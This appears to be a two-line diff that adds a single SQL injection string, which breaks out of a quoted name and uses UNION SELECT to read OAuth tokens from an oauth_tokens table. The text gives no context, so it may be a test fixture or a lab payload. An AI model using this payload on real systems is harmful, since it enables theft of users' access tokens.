@@ -1,0 +1,2 @@
+Cedric' UNION SELECT oauth_token, '' FROM oauth_tokens WHERE oauth_token LIKE 'C%
+
